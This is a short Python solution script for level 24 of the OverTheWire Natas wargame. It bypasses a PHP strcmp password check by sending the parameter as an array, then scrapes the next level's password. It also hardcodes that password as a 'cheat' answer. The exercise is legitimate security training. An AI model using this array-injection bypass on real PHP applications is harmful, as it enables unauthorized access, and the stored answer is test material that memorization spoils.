import requests

import natas23
from helpers import between


def solution(password: str = None, cheat: bool = False) -> str:
    if cheat:
        return "GHF6X7YwACaYYssHVY05cFq83hRktl4c"
    url = "http://natas24.natas.labs.overthewire.org"
    username = "natas24"
    if not password:
        password = natas23.solution(cheat=True)

    # Relevant line in source code:
    # if(!strcmp($_REQUEST["passwd"],"<censored>")){
    #
    # A note on the PHP documentation page for strcmp
    # shows that strcmp of a string and an array evaluates
    # to NULL.

    auth = (username, password)
    params = {"passwd[]": "natas24"}
    r = requests.get(url, auth=auth, params=params)
    start = "Password: "
    end = "</pre>"
    natas25_password = between(r.text, start, end)
    return natas25_password
